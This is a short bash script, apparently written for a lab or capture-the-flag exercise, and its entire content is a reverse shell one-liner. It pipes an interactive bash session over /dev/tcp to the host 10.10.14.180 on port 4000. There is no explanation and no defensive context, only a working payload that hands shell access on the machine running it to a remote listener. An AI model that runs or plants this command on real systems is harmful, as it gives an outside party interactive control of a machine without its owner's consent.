#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.180/4000 0>&1"
